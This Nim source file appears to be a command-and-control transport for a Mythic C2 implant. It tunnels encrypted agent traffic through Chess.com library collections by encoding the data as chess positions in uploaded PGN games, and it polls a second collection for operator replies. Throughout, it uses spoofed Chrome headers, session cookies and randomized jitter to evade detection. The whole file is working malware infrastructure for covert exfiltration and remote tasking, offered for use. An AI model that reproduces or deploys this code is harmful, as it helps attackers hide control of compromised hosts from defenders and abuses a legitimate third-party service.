## Chess.com library collections transport — Mythic profile chesscom / CheckmateC2 compatible.
## Compile with -d:c2ProfileChesscom

import std/[httpclient, json, strutils, base64, random, math, os]
import config, crypto/aes, core/utils

const
  MarkerFen = "7k/8/8/8/8/8/8/7K w - - 0 1"
  Alphabet = "PNBRQ"
  ChunkSize = 100
  DefaultSkip1 = "1acdf52c-1df4-11f1-87b9-b143e701000d"
  DefaultSkip2 = "e0335fb2-1e19-11f1-88eb-c276b801000d"

let PgnTemplate =
  "[Event \"?\"]\n[Site \"?\"]\n[Date \"????.??.??\"]\n[Round \"?\"]\n" &
  "[White \"?\"]\n[Black \"?\"]\n[Result \"*\"]\n[SetUp \"1\"]\n[FEN \"$1\"]\n\n*"

type
  Transport* = ref object
    client: HttpClient
    jsonHeaders: HttpHeaders
    itemHeaders: HttpHeaders

proc alphabetIndex(c: char): int =
  for i in 0 ..< Alphabet.len:
    if Alphabet[i] == c: return i
  return -1

proc stripLeadingZeros(d: var seq[uint8]) =
  while d.len > 1 and d[0] == 0:
    d.delete(0)
  if d.len == 1 and d[0] == 0:
    d.setLen(0)

## Big-endian byte integer ÷ 5 (same semantics as Python int for Base5 / CheckmateC2).
proc divmod5BE(d: var seq[uint8]): int =
  var rem = 0
  for i in 0 ..< d.len:
    let cur = rem * 256 + d[i].int
    d[i] = (cur div 5).uint8
    rem = cur mod 5
  stripLeadingZeros(d)
  result = rem

proc mul5BE(d: var seq[uint8]) =
  if d.len == 0:
    return
  var carry = 0
  var i = d.high
  while i >= 0:
    let v = d[i].int * 5 + carry
    d[i] = (v and 0xff).uint8
    carry = v shr 8
    dec i
  while carry > 0:
    d.insert((carry and 0xff).uint8, 0)
    carry = carry shr 8

proc addSmallBE(d: var seq[uint8]; addend: int) =
  if addend == 0:
    return
  if d.len == 0:
    d.add(addend.uint8)
    return
  var carry = addend
  var i = d.high
  while i >= 0:
    let v = d[i].int + carry
    d[i] = (v and 0xff).uint8
    carry = v shr 8
    if carry == 0:
      return
    dec i
  while carry > 0:
    d.insert((carry and 0xff).uint8, 0)
    carry = carry shr 8

proc encodeBase5(data: seq[byte]): string =
  if data.len == 0:
    return ""
  var work = cast[seq[uint8]](data)
  while work.len > 1 and work[0] == 0:
    work.delete(0)
  if work.len == 1 and work[0] == 0:
    return "P"
  var digits: seq[char] = @[]
  while work.len > 0:
    let r = divmod5BE(work)
    digits.add(Alphabet[r])
  for i in countdown(digits.high, 0):
    result.add(digits[i])

proc decodeBase5(enc: string): seq[byte] =
  if enc.len == 0:
    return @[]
  var acc: seq[uint8] = @[]
  for c in enc:
    let idx = alphabetIndex(c)
    if idx < 0:
      continue
    mul5BE(acc)
    addSmallBE(acc, idx)
  stripLeadingZeros(acc)
  result = cast[seq[byte]](acc)

proc joinFenParts(g: seq[string]): string =
  result = g[0]
  for j in 1 .. 7:
    result.add("/")
    result.add(g[j])
  result.add(g[8])

proc stringToFen(encoded: string): seq[string] =
  var chunks: seq[string] = @[]
  var pos = 0
  while pos < encoded.len:
    chunks.add(encoded.substr(pos, min(pos + 7, encoded.high)))
    pos += 8

  let fenTemplate = @["7k", "8", "8", "8", "8", "8", "8", "7K", " w - - 0 1"]
  var fenData: seq[string] = @[]
  var i = 0
  var ci = 0
  while ci < chunks.len:
    let c = chunks[ci]
    if fenData.len < 6:
      if i <= 2:
        fenData.add(c.toLowerAscii())
      else:
        fenData.add(c.toUpperAscii())
      inc i
      inc ci
    else:
      var gbuild: seq[string] = @[]
      gbuild.add(fenTemplate[0])
      for x in fenData:
        gbuild.add(x)
      gbuild.add(fenTemplate[7])
      gbuild.add(fenTemplate[8])
      result.add(joinFenParts(gbuild))
      fenData = @[]
      if c.len > 0:
        fenData.add(c.toLowerAscii())
        i = 1
        inc ci
        continue
      else:
        break

  if fenData.len > 0:
    for j in 0 .. fenData.high:
      if fenData[j].len < 8:
        fenData[j] = fenData[j] & $(8 - fenData[j].len)
    let padCount = max(0, 6 - fenData.len)
    var pad: seq[string] = @[]
    for _ in 1 .. padCount:
      pad.add("8")
    var gbuild: seq[string] = @[]
    gbuild.add(fenTemplate[0])
    for x in fenData:
      gbuild.add(x)
    for x in pad:
      gbuild.add(x)
    gbuild.add(fenTemplate[7])
    gbuild.add(fenTemplate[8])
    result.add(joinFenParts(gbuild))

proc fenToString(fen: string): string =
  let parts = fen.split("/")
  if parts.len < 7: return ""
  for j in 1 .. min(6, parts.high):
    result.add(parts[j])

proc shouldSkip(id: string; skip: seq[string]): bool =
  let lo = id.toLowerAscii()
  for s in skip:
    if s.len > 0 and lo == s.toLowerAscii():
      return true
  return false

proc parseGamesJson(body: string; skip: seq[string]): seq[tuple[id: string, fen: string]] =
  let root = parseJson(body)
  if root.kind != JObject: return @[]
  let data = root{"data"}
  if data.isNil or data.kind != JArray: return @[]
  for item in data:
    if item.kind != JObject: continue
    let id = item{"id"}.getStr("")
    var fen = ""
    let tsd = item{"typeSpecificData"}
    if not tsd.isNil and tsd.kind == JObject:
      let sd = tsd{"shareData"}
      if not sd.isNil and sd.kind == JObject:
        let ph = sd{"pgnHeaders"}
        if not ph.isNil and ph.kind == JObject:
          fen = ph{"FEN"}.getStr("")
    if id.len > 0 and fen.len > 0 and not shouldSkip(id, skip):
      result.add((id, fen))

proc chessReferer(): string =
  if ChessLibraryReferer.len > 0:
    result = ChessLibraryReferer
  else:
    result = "https://www.chess.com/analysis"

proc buildJsonHeaders(): HttpHeaders =
  ## Pas de Host manuel ; Client Hint comme Chrome (aligné chesscom_client.py).
  newHttpHeaders({
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://www.chess.com",
    "Referer": chessReferer(),
    "User-Agent": UserAgent,
    "Cookie": ChessCookie,
    "sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
  })

proc buildItemHeaders(): HttpHeaders =
  newHttpHeaders({
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://www.chess.com",
    "Referer": chessReferer(),
    "User-Agent": UserAgent,
    "Cookie": ChessCookie,
    "sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
  })

proc newTransport*(): Transport =
  result = Transport(
    client: newHttpClient(),
    jsonHeaders: buildJsonHeaders(),
    itemHeaders: buildItemHeaders(),
  )

proc buildMessage*(currentUUID: string, aesKey: seq[byte], jsonBody: string): string =
  var uuidPadded = currentUUID
  while uuidPadded.len < 36:
    uuidPadded.add('\x00')
  let uuidBytes = toBytes(uuidPadded[0 .. 35])
  if aesKey.len == 32:
    result = base64.encode(uuidBytes & aesEncrypt(aesKey, jsonBody))
  else:
    result = base64.encode(uuidBytes & toBytes(jsonBody))

proc parseResponse*(raw: seq[byte], aesKey: seq[byte]): string =
  if raw.len < 36: return ""
  let bodyPart = raw[36 .. ^1]
  if aesKey.len == 32:
    result = aesDecrypt(aesKey, bodyPart)
  else:
    result = fromBytes(bodyPart)

proc mergeSkipIds(): seq[string] =
  result = @[DefaultSkip1, DefaultSkip2]
  for part in ChessSkipItemIds.split({','}):
    let p = part.strip()
    if p.len > 0:
      result.add(p)

proc sleepThrottle() =
  let extra = int(rand(float(ChessJitterSeconds) * 1000.0))
  sleep(ChessWaitMs + extra)

proc listGames(t: Transport; collectionId: string): seq[tuple[id: string, fen: string]] =
  let url = "https://www.chess.com/callback/library/collections/" & collectionId &
    "/items?page=1&itemsPerPage=10000&gameSort=1&gamePlayer1="
  try:
    t.client.headers = t.itemHeaders
    let resp = t.client.get(url)
    if not resp.code.is2xx:
      stderr.writeLine("[!] chess list HTTP " & $resp.code)
      return @[]
    result = parseGamesJson(resp.body, mergeSkipIds())
  except Exception as e:
    stderr.writeLine("[!] chess list error: " & e.msg)

proc clearCollection(t: Transport; collectionId: string) =
  let games = t.listGames(collectionId)
  if games.len == 0:
    stderr.writeLine("[*] chess clear " & collectionId[0 .. min(7, collectionId.high)] & "… already empty")
    return
  stderr.writeLine("[*] chess clear " & collectionId[0 .. min(7, collectionId.high)] & "… deleting " & $games.len & " items")
  var i = 0
  while i < games.len:
    var ids = newJArray()
    let lim = min(i + ChunkSize, games.len)
    for j in i ..< lim:
      ids.add(%games[j].id)
    let payload = %*{"_token": ChessClearToken, "itemIds": ids}
    let url = "https://www.chess.com/callback/library/collections/" & collectionId & "/actions/remove-items"
    try:
      t.client.headers = t.jsonHeaders
      let resp = t.client.post(url, body = $payload)
      if not resp.code.is2xx():
        stderr.writeLine("[!] chess clear HTTP " & $resp.code & " for " & collectionId[0 .. min(7, collectionId.high)] & "…")
      else:
        stderr.writeLine("[+] chess clear OK (" & $resp.code & ")")
    except Exception as e:
      stderr.writeLine("[!] chess clear: " & e.msg)
    i = lim

proc uploadGames(t: Transport; collectionId: string; fens: seq[string]) =
  var pgn = ""
  for fen in fens:
    let one = PgnTemplate.replace("$1", fen)
    pgn.add("\n\n")
    pgn.add(one)
  let payload = %*{"_token": ChessUploadToken, "pgn": pgn}
  let url = "https://www.chess.com/callback/library/collections/" & collectionId & "/actions/add-from-pgn"
  try:
    t.client.headers = t.jsonHeaders
    discard t.client.post(url, body = $payload)
  except Exception as e:
    stderr.writeLine("[!] chess upload batch: " & e.msg)

proc uploadPayload(t: Transport; collectionId: string; payload: seq[byte]) =
  sleepThrottle()
  t.clearCollection(collectionId)
  let encoded = encodeBase5(payload)
  var fens = stringToFen(encoded)
  fens.insert(MarkerFen, 0)
  var chunks: seq[seq[string]] = @[]
  var idx = 0
  while idx < fens.len:
    let lim = min(idx + ChunkSize, fens.len)
    var ch: seq[string] = @[]
    for j in idx ..< lim:
      ch.add(fens[j])
    chunks.add(ch)
    idx = lim
  for k in countdown(chunks.high, 0):
    t.uploadGames(collectionId, chunks[k])
    sleepThrottle()

proc waitDownload(t: Transport; collectionId: string): seq[byte] =
  while true:
    let games = t.listGames(collectionId)
    stderr.writeLine("[*] chess waitDownload: " & $games.len & " items in " &
      collectionId[0 .. min(7, collectionId.high)] & "…" &
      (if games.len > 0: " first=" & games[0].fen[0 .. min(15, games[0].fen.high)] else: ""))
    if games.len >= 1 and games[0].fen == MarkerFen:
      var fenConcat = ""
      for g in games:
        fenConcat.add(fenToString(g.fen))
      var b5 = ""
      for c in fenConcat.toUpperAscii():
        if not c.isDigit():
          b5.add(c)
      result = decodeBase5(b5)
      stderr.writeLine("[*] chess waitDownload: decoded " & $result.len & " bytes, clearing collection")
      t.clearCollection(collectionId)
      return
    sleep(3000)

proc strToUtf8(s: string): seq[byte] =
  result = newSeq[byte](s.len)
  for i in 0 .. s.high:
    result[i] = byte(s[i])

proc post*(t: Transport; currentUUID: string, aesKey: seq[byte], jsonBody: string): string =
  let msg = buildMessage(currentUUID, aesKey, jsonBody)
  let payloadUtf8 = strToUtf8(msg)
  stderr.writeLine("[*] Chess.com upload → agent collection (" & $payloadUtf8.len & " B)")
  t.uploadPayload(ChessAgentUploadCollection, payloadUtf8)
  stderr.writeLine("[*] Chess.com pre-clearing reply collection to remove stale data")
  t.clearCollection(ChessServerReplyCollection)
  let downloaded = t.waitDownload(ChessServerReplyCollection)
  if downloaded.len == 0:
    stderr.writeLine("[!] Chess empty download")
    return ""
  let b64txt = fromBytes(downloaded)
  try:
    let rawResp = toBytes(base64.decode(b64txt))
    result = parseResponse(rawResp, aesKey)
    if result.len > 0:
      stderr.writeLine("[+] Chess response OK (" & $result.len & " B JSON)")
  except Exception as e:
    stderr.writeLine("[!] Chess parse: " & e.msg)
    result = ""
